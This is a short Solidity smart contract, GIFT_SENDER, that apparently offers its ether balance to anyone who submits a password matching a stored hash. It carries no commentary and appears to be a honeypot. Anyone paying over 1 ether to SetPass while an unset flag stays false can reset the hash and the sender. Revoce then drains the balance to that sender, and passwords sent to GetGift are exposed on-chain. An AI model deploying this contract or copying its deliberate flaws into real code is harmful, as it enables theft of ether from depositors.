1 pragma solidity ^0.4.19;
2 
3 contract GIFT_SENDER
4 {
5     bool passHasBeenSet = false;
6     
7     address sender;
8     
9     bytes32 public hashPass;
10 	
11 	function() public payable{}
12     
13     function GetHash(bytes pass) public constant returns (bytes32) {return sha3(pass);}
14     
15     function SetPass(bytes32 hash)
16     public
17     payable
18     {
19         if(!passHasBeenSet&&(msg.value > 1 ether))
20         {
21             hashPass = hash;
22             sender = msg.sender;
23         }
24     }
25     
26     function GetGift(bytes pass)
27     external
28     payable
29     {
30         if(hashPass == sha3(pass))
31         {
32             msg.sender.transfer(this.balance);
33         }
34     }
35     
36     function Revoce()
37     public
38     payable
39     {
40         if(msg.sender==sender)
41         {
42             sender.transfer(this.balance);
43         }
44     }
45     
46     function PassHasBeenSet(bytes32 hash)
47     public
48     {
49         if(hash==hashPass)
50         {
51            passHasBeenSet=true;
52         }
53     }
54 }